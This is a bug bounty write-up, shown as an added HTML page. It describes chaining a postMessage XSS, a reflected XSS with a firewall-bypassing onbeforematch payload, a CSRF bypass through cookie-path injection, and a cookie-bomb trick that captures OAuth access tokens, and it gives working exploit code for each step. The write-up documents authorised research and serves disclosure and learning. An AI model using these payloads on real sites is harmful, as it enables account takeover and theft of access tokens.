@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Writeup</title>
+  <style>
+    :root {
+      background: #0a0a0a;
+  color: #ddd;
+      --max: 760px;
+    }
+
+    * { box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .page {
+      min-height: 100vh;
+    }
+
+    .site-header {
+      width: 100%;
+      padding: 18px 32px 0;
+    }
+
+    .site-header-inner {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 22px;
+      color: #f3f3f4;
+    }
+
+    .site-header-inner .icon {
+      font-size: 18px;
+      opacity: 0.9;
+    }
+
+    .container {
+      width: min(calc(100% - 48px), var(--max));
+      margin: 0 auto;
+    }
+
+    .hero {
+      padding-top: 82px;
+    }
+
+    .post-title {
+      margin: 0;
+      font-size: clamp(40px, 5.2vw, 54px);
+      line-height: 1.12;
+      letter-spacing: -0.035em;
+      font-weight: 800;
+      color: #e9e9eb;
+    }
+
+    .post-meta {
+      margin-top: 12px;
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.6;
+    }
+
+    .toc {
+      margin-top: 28px;
+      background: var(--panel);
+      border-radius: 10px;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+
+    .toc summary {
+      list-style: none;
+      cursor: pointer;
+      padding: 16px 22px;
+      font-size: 18px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      user-select: none;
+    }
+
+    .toc summary::-webkit-details-marker { display: none; }
+
+    .toc summary::before {
+      content: "▶";
+      font-size: 15px;
+      transform: translateY(-1px);
+      opacity: 0.95;
+      transition: transform 0.2s ease;
+    }
+
+    .toc[open] summary::before {
+      transform: rotate(90deg);
+    }
+
+    .toc-content {
+      padding: 0 22px 16px 49px;
+      color: var(--muted);
+    }
+
+    .toc-content ol {
+      margin: 0;
+      padding-left: 18px;
+    }
+
+    .toc-content li + li {
+      margin-top: 10px;
+    }
+
+    main.article {
+      padding: 52px 0 100px;
+    }
+
+    .article p {
+      margin: 0 0 24px;
+      font-size: 21px;
+      line-height: 1.75;
+      color: #e2e3e6;
+      letter-spacing: -0.012em;
+    }
+
+    .article p:last-child {
+      margin-bottom: 0;
+    }
+
+    .article a {
+      text-decoration: underline;
+      text-underline-offset: 5px;
+      text-decoration-thickness: 1px;
+    }
+
+    .article h2 {
+      margin: 80px 0 18px;
+      font-size: 34px;
+      line-height: 1.2;
+      letter-spacing: -0.03em;
+      font-weight: 800;
+      color: #ededee;
+    }
+
+    .article img {
+      display: block;
+      max-width: 100%;
+      height: auto;
+      border-radius: 12px;
+      margin: 28px 0;
+    }
+
+    .article hr {
+      border: 0;
+      height: 1px;
+      background: var(--line);
+      margin: 54px 0;
+    }
+
+    .article blockquote {
+      margin: 28px 0;
+      padding: 8px 0 8px 18px;
+      border-left: 3px solid rgba(255,255,255,0.14);
+      color: var(--muted);
+    }
+
+    .article code {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.9em;
+      background: rgba(255,255,255,0.05);
+      padding: 0.15em 0.35em;
+      border-radius: 6px;
+    }
+
+    .article pre {
+      overflow-x: auto;
+      padding: 18px 20px;
+      border-radius: 12px;
+      background: #181a1f;
+      border: 1px solid rgba(255,255,255,0.05);
+      margin: 24px 0 28px;
+    }
+
+    .article pre code {
+      background: transparent;
+      padding: 0;
+      border-radius: 0;
+      font-size: 15px;
+      line-height: 1.7;
+      color: #d8dae0;
+    }
+
+    .lead-space {
+      height: 4px;
+    }
+
+    @media (max-width: 900px) {
+      .site-header {
+        padding-left: 22px;
+        padding-right: 22px;
+      }
+
+      .container {
+        width: min(calc(100% - 32px), var(--max));
+      }
+
+      .hero {
+        padding-top: 56px;
+      }
+
+      .post-title {
+        font-size: clamp(32px, 8vw, 44px);
+      }
+
+      .article p {
+        font-size: 18px;
+      }
+
+      .article h2 {
+        font-size: 28px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <header class="site-header">
+      <div class="site-header-inner">
+        <span>bug.writeups</span>
+     
+      </div>
+    </header>
+
+    <section class="hero">
+      <div class="container">
+        <h1 class="post-title">Chaining multiple xss with oauth to get account takeover</h1>
+        <div class="post-meta">7th April, 2026</div>
+
+        <details class="toc">
+          <summary>Table of Contents</summary>
+          <div class="toc-content">
+            <ol>
+              <li><a href="#section-1">Postmessage xss</a></li>
+              <li><a href="#section-2">Post-based reflected xss</a></li>
+              <li><a href="#section-3">Bypassing the csrf protection</a></li>
+              <li><a href="#section-4">Chaining with oauth to get Account takeover</a></li>
+              <li><a href="#section-5">Final thoughts</a></li>
+            </ol>
+          </div>
+        </details>
+      </div>
+    </section>
+
+    <main class="article">
+      <div class="container">
+        <p>I am writing this article about a chain of xss that I found in a private hackerone BBP which lead to ATO. I chained multiple issues including  a postmessage xss with a post based xss and oauth to achieve Account takeover.</p>
+
+       
+
+        <h2 id="section-1">1. Initial postmessage xss</h2>
+        <p>The scope of the program was a wildcard so I was going through some of the subdomains. In one of the subdomains smth like account-cn.target.com, I noticed a possibly dangerous postmessage handler in which it was directly setting the location.href property to any arbitary message. Simplified version of the vulnerable code:</p>
+         <pre><code>function handleMessage(t) {
+  if (typeof t.data !== "string") return;
+
+  const { action, payload } = JSON.parse(decodeURIComponent(t.data));
+
+  if (action === Xl.somestring && ef) {
+    nf.href = payload?.url || "";
+  }
+}</code></pre>
+        
+        <p>At first, I wanted to make sure that the nf referred to the actual window So I went through the code flow using the debugger of chrome and surely enough, it was indeed referring to the window. Now, I just needed to make the condition of the if block evaluate to true and I'll get the xss. </p>
+        <p>The first condition was pretty straightforward and it simply checked if the incoming message included a value named <code>action</code> and compared it with the value of <code>X1.somestring(X1.somestring simply returned 'somestring')</code> </p>
+        <p>Now, onto the second condition <code>ef</code>. While analyzing the code flow, I observed the it was being set to <code>false</code> by default and I searched thorughout the js file to find out where it was being set. Finally, I found the line where it was setting the value of <code>ef</code>. The code was similar to this:<pre><code>ef = location.href.indexOf('something') > - 1
+</code></pre>  </p>
+<p>This simply checked if the url contained <code>something</code> parameter in the url, so we can satisfy this condition by simply including the parameter.<pre><code>https://account-cn.target.com/?something=whatever</code></pre></p>
+<p>
+    Finally, I made the xss popup by simply opening the url in an iframe and sending the message to the iframe after it has been loaded. Exploit code looked similar to this: 
+    <pre><code>
+&lt;iframe
+  id="myIframe"
+  src="https://account.target.com?something=whatever"
+&gt;
+&lt;/iframe&gt;
+
+&lt;script&gt;
+  const iframe = document.getElementById("myIframe");
+
+  const message2 = {
+    action: "somestring",
+    payload: {
+      url: "javascript:alert(document.domain)"
+    }
+  };
+
+  const encodedData2 = encodeURIComponent(JSON.stringify(message2));
+
+  // Send message immediately after iframe loads
+  iframe.addEventListener("load", () =&gt; {
+    iframe.contentWindow.postMessage(encodedData2, "*");
+  });
+&lt;/script&gt;
+</code></pre>
+and the xss popped,
+<img src="https://yunxohang.github.io/writeups/Screenshot%202026-04-07%20123555.png" alt="Section image" />
+
+       
+
+        <h2 id="section-2">2. Post based reflected xss</h2>
+        <p>I was going thorugh <code>account.target.com</code> which was the main subdomain for authentication including oauth response of this target. There, I noticed a feature to send support tickets. The request to send a ticket looked like this<pre><code>POST /submit HTTP/1.1
+Host: account.target.com
+Cookie: _csrf_token_=_csrf_tk_1450275545240563;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
+
+
+problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=0z4uvdqlpr5l3ad01nhw&type=withoutAccount&_csrf_token_=_csrf_tk_1450275545240563</code></pre></p>
+and the response
+<pre><code>HTTP/2 200 OK
+Date: Tue, 07 Apr 2026 07:03:23 GMT
+Content-Type: text/html;charset=UTF-8
+Server: Tengine
+Vary: Accept-Encoding
+Access-Control-Allow-Origin: https://account.target.com
+Access-Control-Allow-Methods: POST,GET,OPTIONS,HEAD
+Access-Control-Max-Age: 3600
+Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, X-XSRF-TOKEN, X-CSRF-TOKEN
+Access-Control-Allow-Credentials: true
+Strict-Transport-Security: max-age=0
+Timing-Allow-Origin: *
+Eagleeye-Traceid: 1a0d88cd17755454035858302ef361
+
+{"code":"1001","success":false,"requestId":"0z4uvdqlpr5l3ad01nhw","message":"invalid noCaptcha parameter"}</code></pre><p>
+I immediately noticed that <code>requestId</code> was being reflected then I simply tried some html tags and it reflected them as it is and since it was being served with <code>Content-Type: text/html;charset=UTF-8</code> it was reflecting the payload as html.</p><pre><code>{"code":"1001","success":false,"requestId":"&lt;h2&gt;I_am_valid_html&lt;/h2&gt;","message":"invalid noCaptcha parameter"}</code></pre>
+<p>Now, I simply tried the payload <code>&lt;img src=x onerror=alert()&gt; </code>, but basic payloads were being blocked by the firewall but I got the xss using the payload <pre><code>&lt;html id=test&gt;&lt;html onbeforematch='alert(document.cookie)'&gt;&lt;html hidden=until-found&gt;
+</html></code></pre></p>
+<p>Finally, I got the xss, right? Nope, I tried changing the method to <code>GET</code>, it was acting the same as <code>POST</code> and I was getting the same response but when I tried opening the exploit url in another browser, I was greeted with a csrf error.<pre><code>HTTP/2 200 OK
+Date: Tue, 07 Apr 2026 07:15:19 GMT
+Content-Type: text/html;charset=utf-8
+Server: Tengine
+Vary: Accept-Encoding
+Access-Control-Allow-Origin: https://account.target.com
+Access-Control-Allow-Methods: POST,GET,OPTIONS,HEAD
+Access-Control-Max-Age: 3600
+Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, X-XSRF-TOKEN, X-CSRF-TOKEN
+Access-Control-Allow-Credentials: true
+Strict-Transport-Security: max-age=0
+Timing-Allow-Origin: *
+Eagleeye-Traceid: 1a4a1d7217755461196035288ed8fc
+
+{"csrfError":true}</code></pre></p>
+<p>Upon some further analysis, I realized that the target was using a classic csrf protection defense. So, what it did was simply compare the value of the csrf token in the url with the csrf token present in the cookie<pre><code>GET /submit?problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=0z4uvdqlpr5l3ad01nhw&type=withoutAccount&_csrf_token_=must_be_same HTTP/1.1
+Host: account.target.com
+Cookie: _csrf_token=must_be_same
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0</code></pre><p>This csrf token was being set when the user first visited the site. I tried some basic ways to bypass this protection but nothing was working. So, this was pretty much a self-xss since there was no way for me to know the value of this token beforehand :)</p>
+        
+
+        <h2 id="section-3">3. Bypassing the csrf protection</h2>
+        <p>Luckily I had the postmessage xss on one of the subdomains of the target. So, I could just set a csrf cookie with the <code>path</code> attribute and then include  that same value in the exploit url which would finally bypass the csrf protection.</p><pre><code>document.cookie = 'csrf_token=haha; domain=.target.com; path=/submit/' ;</code></pre><p>When the <code>path</code> attribute is included, it will take precedence over other cookies with the same name for that specific path. Since the target would have already set the csrf cookie, I had to use the <code>path</code> attribute to make sure that the target would use my attacker set cookie instead of the other one.</p><p>Now, when the victim opened the exploit url, following request will be sent: <pre><code>GET /submit?problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=0z4uvdqlpr5l3ad01nhw&type=withoutAccount&_csrf_token_=i_was_set_by_attacker HTTP/1.1
+Host: account.target.com
+Cookie: _csrf_token=i_was_set_by_attacker;  _csrf_token=i_was_set_by_target
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0</code></pre></p><p>The final exploit code:<pre><code> let b = window.open("https://account-cn.target.com?something=whatever");
+
+  const message2 = {
+    action: "somestring",
+    payload: {
+      url: "javascript:document.cookie = 'csrf_token=i_was_set_by_attacker; domain=.target.com; path=/account_appeal_intl/;', window.location.href = 'https://account.target.com/submit?problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=&lt;xss_payload&gt;&type=withoutAccount&_csrf_token_=i_was_set_by_attacker';"
+    }
+  };
+
+  const encodedData2 = encodeURIComponent(JSON.stringify(message2));
+
+  // Send message after 5 seconds
+  setTimeout(() => {
+    if (!b.closed) {
+      b.postMessage(encodedData2, "*");
+    }
+  }, 8000);</code></pre></p>
+     
+
+      
+
+        <h2 id="section-4">4. Chaining with oauth to get Account takeover</h2>
+        <p>Now that we have our xss on the same domain that handles the oauth response, getting the ATO is pretty straightforward. In high level view, we can just cookie dos the account.target.com host -> open the oauth page -> returns to account.target.com with the access token -> host is down, just read the location.href property thrugh the reference since we have the xss on the same origin.</p>
+        <p>Js code used for cookie dos: <pre><code>for (let i = 1; i <= 300; i++) { document.cookie = `testCookie${i}=${`A`.repeat(1200)}_${i}; path=/` } 
+</code></pre></p>
+<p>
+Final exploit flow:
+</p>
+<p>1. First we open the page vulnerable to postmessage xss using window.open with the reference let's say <code>b</code> and send the postmessage xss which sets the csrf cookie with path attribute.
+</p>
+<p>2. In the same postmessage payload, also change the window.location.href property to <code>https://account.target.com/submit?contactMobile=23324234&contactEmail=test%40gmail.com&requestId=&lt;xss_payload&gt;&type=withoutAccount&_csrf_token_=i_was_set_by_attacker</code> after the csrf_cookie has been set </p>
+<p>3. Now, Since the cookie and url have the same value of csrf token, csrf error will not be triggered and the value of <code>requestId</code> will be reflected</p>
+<p>4. In the <code>requestId</code> parameter, we will use the payload to perform cookie dos and steal the token, exploit code: <pre><code>&lt;html id="test"&gt;
+&lt;html onbeforematch="
+for (let i = 1; i &lt;= 300; i++) {
+  document.cookie = `testCookie${i}=${`A`.repeat(1200)}_${i}`;
+}
+testw = window.open(`oauth_url`, `example`, `width=600,height=400,status=yes,scrollbars=yes,resizable=yes`);
+(function tryToObtainToken() {
+  setTimeout(function() {
+    try {
+      const test = testw.window.location;
+      if (test.toString() !== `about:blank`) {
+        alert(test);
+        testw.close();
+        return;
+      }
+    } catch (error) {
+      console.log(error);
+    }
+    tryToObtainToken();
+  }, 100);
+})();
+"&gt;
+&lt;html hidden="until-found"&gt;</code></pre></p>
+<p>5. you'll get a popup with the access token which you can use to login as the victim</p>
+ <h2 id="section-5">5. Final thoughts</h2>
+ <p>Despite all the effort, the program only triaged it as a normal xss. I was really disappointed about it but I learned a lot of things when building this exploit chain and it was really fun when it finally worked :)  Happy Hacking!</p>
+      </div>
+    </main>
+  </div>
+</body>
+</html>
